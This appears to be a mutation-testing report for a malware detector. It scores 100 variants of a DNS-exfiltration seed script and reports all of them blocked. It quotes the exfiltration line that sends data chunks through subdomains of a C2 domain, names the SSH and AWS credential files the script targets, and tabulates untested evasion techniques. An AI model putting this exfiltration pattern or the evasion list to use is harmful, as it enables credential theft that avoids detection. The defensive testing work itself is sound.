# M01_dns_exfil — Mutation Analysis

**Seed:** M01_dns_exfil.py
**Mutations generated:** 100
**Semantic validation:** 100/100 pass (AST validator)
**Safe-exec analysis:** 100/100 analyzed
**Detection rate:** 100/100 (100%)
**False negatives:** 0

## Mutation Type Distribution

| Type | Count | Detection Impact |
|---|---|---|
| Dead import | 43 | None |
| Dead function | 41 | None |
| Type hints | 24 | None |
| Dead variable | 18 | None |
| Cosmetic only | 14 | None |
| Variable rename | 12 | None |
| Extra print | 9 | None |
| Single quotes | 9 | None |
| Comments stripped | 5 | Marginal — removes self-incriminating comments |

## All Verdicts: 🚫 BLOCK

All 100 mutations were correctly blocked. The attack fingerprint is too
distinctive across all current mutation strategies:

- `socket.gethostbyname(f"{i}.{chunk}.{C2_DOMAIN}")` — always in live code
- `~/.ssh/id_rsa`, `~/.aws/credentials` — credential targets always present
- `collect_data()` → `exfiltrate_via_dns()` — data flow always intact

## Evasion Gaps (not tested by current mutations)

| Technique | Why it might evade | Difficulty |
|---|---|---|
| Replace `socket.gethostbyname` with ctypes/dnspython | Removes obvious DNS API call | Hard |
| Encode credential paths (`b64decode("...")`) | Hides target strings | Medium |
| Split into two scripts | Collection + exfil separated | Medium |
| Dynamic attribute access (`getattr(socket, 'gethostbyname')`) | Avoids static string match | Easy |
| Use `subprocess` to call `dig` or `nslookup` | Replaces Python DNS with shell | Easy |
